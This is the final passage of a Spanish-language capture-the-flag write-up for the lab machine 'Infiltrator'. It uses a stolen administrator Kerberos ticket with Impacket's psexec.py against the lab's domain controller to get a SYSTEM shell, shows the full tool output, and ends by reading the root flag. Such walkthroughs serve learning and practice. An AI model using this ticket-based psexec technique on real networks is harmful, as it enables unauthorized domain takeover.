Ya tenemos todo lo necesario para entrar con privilegios, podemos hacer desde PassTheHash hasta utilizar las credenciales en caché. Podemos cargar el ticket como una variable de entorno y conectarnos a la máquina con `psexec` de forma privilegiada

~~~ bash
KRB5CCNAME=administrator.ccache psexec.py infiltrator.htb/administrator@dc01.infiltrator.htb -k -no-pass

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc01.infiltrator.htb.....
[*] Found writable share ADMIN$
[*] Uploading file ZePswrik.exe
[*] Opening SVCManager on dc01.infiltrator.htb.....
[*] Creating service zUdz on dc01.infiltrator.htb.....
[*] Starting service zUdz.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6189]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
~~~

Ya podremos ver la flag del sistema que se encuentra ubicada en `C:\Users\Administrator\Desktop\root.txt`

~~~
C:\Windows\system32> cd C:\Users\Administrator 

C:\Users\Administrator> type Desktop\root.txt
c5f4d24c5a8b3e8daf4b357c895aa7c9
~~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> He who has imagination without learning has wings but no feet.
> — Joseph Joubert
{: .notice--info}
